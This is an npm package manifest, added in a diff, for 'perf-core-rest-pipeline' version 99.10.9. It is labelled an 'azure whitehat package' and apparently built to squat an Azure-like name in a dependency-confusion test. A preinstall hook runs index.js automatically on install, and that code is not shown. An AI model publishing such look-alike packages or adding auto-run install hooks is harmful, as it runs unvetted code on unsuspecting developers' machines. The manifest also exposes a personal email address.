@@ -1,0 +1,39 @@
+{
+    "name": "perf-core-rest-pipeline",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-core-rest-pipeline@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-l5OEmrrnn7ZmpUIZU/7lKdprDoCiwn5fqYxr9HPUL1wW0p2pcR6KI0Oi14MNQE9Cf/3PlsbgwLFYHRsYnTrqvg==",
+        "shasum": "6c383ee8c63c664905095a38db29f5b779f7370f",
+        "tarball": "https://registry.npmjs.org/perf-core-rest-pipeline/-/perf-core-rest-pipeline-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3587,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSfdCRA9TVsSAnZWagAAp5QQAIQGOqdaUONRJh1+UK9d\nW53/H15ASfzRidvNY0E8fz9vysgTAun0+XacJy9XKemoCRiPWooD4kkb4EqG\nHRE2hOZ9mSNDDLtHF+/RHjlLTo53GDMnhFvqtfdduk65/6pp7RAi43z9zL0O\nQEc8rvjGTgdU5CSnLfbWyTFLeyyiEJ5ABoZvCTOIvzY3ACUNEVxHhqWkccAo\nbYkWHaMnZWbSjD61DnJ8acF8yCGT2SekvPLtk2RCLIyP+qpsnQov300qZ0Jc\n5DgPI7RlNfHepTPOs4PhNBYkNzs7SAYf1AyqY8nbh6cJaZcMY7DZqbrTsp8e\nhUMbnltItdFsSNcZEZZ9VKHFogurlqQPj858MPKr7zB4IOZfxVEuB0AstJvP\niUzKfzjqIkndo8dlzUmb9U9Ic5ePCZeBhC4doFcv7Nd2VZMLkO56FA75eSwC\nnDlEgoKiWCPUjXsx18ChO11FFNjW0KWyl8tKh3npXLGFV45eEs3m3SfA4w3H\nATaKE1DajFv4h1ivlXn3eH8x7uFQ0QuWeEL70k4CcqVxMzBt6tifpqCoAK6K\nqLJzb6UzyLVkOnWYHwf1VY3f5hJX0S1DsPPsQP+sCTfdRT5bo1K7uqH/D+n1\neuB5gE+Z1eLfmwWPhV+y3SBx8IQh7oiLh7P58RJbYhuWHy1ZYBzMJ67j5wbc\nWCz6\r\n=WWj7\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-core-rest-pipeline_99.10.9_1637951453195_0.024758693724301617"
+    },
+    "_hasShrinkwrap": false
+}
